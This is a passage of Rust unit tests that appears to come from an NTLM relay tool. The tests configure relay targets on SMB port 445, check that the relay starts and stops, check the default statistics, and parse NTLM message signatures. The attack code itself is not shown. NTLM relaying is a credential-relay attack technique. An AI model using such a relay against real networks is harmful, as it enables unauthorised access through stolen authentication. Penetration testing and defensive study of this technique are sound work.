            address: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 10)), 445),
            protocol: Protocol::Smb,
            username: None,
        };

        let config = RelayConfig {
            listen_ip: "0.0.0.0".to_string(),
            targets: vec![target],
            round_robin: true,
            remove_on_success: true,
            timeout_secs: 30,
        };

        assert_eq!(config.listen_ip, "0.0.0.0");
        assert_eq!(config.targets.len(), 1);
    }

    #[tokio::test]
    async fn test_relay_lifecycle() {
        let config = RelayConfig::default();
        let mut relay = NtlmRelay::new(config);
        assert!(!relay.is_running());

        relay.start().await.unwrap();
        assert!(relay.is_running());

        relay.stop().await.unwrap();
        assert!(!relay.is_running());
    }

    #[test]
    fn test_relay_stats_default() {
        let stats = RelayStats::default();
        assert_eq!(stats.successful_relays, 0);
        assert_eq!(stats.failed_relays, 0);
        assert_eq!(stats.active_connections, 0);
        assert_eq!(stats.total_attempts, 0);
    }

    #[test]
    fn test_ntlm_type_parsing() {
        let negotiate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
            0x01, 0x00, 0x00, 0x00, // Type 1
        ];
        assert_eq!(parse_ntlm_type(&negotiate), Some(NtlmMessageType::Negotiate));

        let challenge = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
            0x02, 0x00, 0x00, 0x00, // Type 2
        ];
        assert_eq!(parse_ntlm_type(&challenge), Some(NtlmMessageType::Challenge));

        let authenticate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
            0x03, 0x00, 0x00, 0x00, // Type 3
        ];
        assert_eq!(parse_ntlm_type(&authenticate), Some(NtlmMessageType::Authenticate));
    }

    #[test]
    fn test_decode_utf16le() {
        // "test" in UTF-16LE
        let data = [0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00];
        let result = decode_utf16le(&data);
        assert_eq!(result, "test");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"Hello, World!";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }
}